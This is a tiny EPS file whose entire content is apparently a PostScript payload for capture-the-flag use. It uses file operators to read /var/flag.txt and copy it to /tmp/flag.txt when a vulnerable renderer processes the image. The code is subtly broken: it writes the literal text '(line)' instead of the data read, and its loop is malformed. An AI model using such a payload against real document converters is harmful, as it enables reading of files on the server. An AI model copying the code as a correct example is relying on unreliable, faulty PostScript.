%!PS-Adobe-2.0 EPSF-1.2
/outf (/tmp/flag.txt) (w) file def
/flagfile (/var/flag.txt) (r) file def

flagfile {
    /line flagfile readline pop
    outf (line) writestring
    outf (\\n) writestring
    /line flagfile readline pop
} loop

outf closefile 
showpage
quit
%%EOF
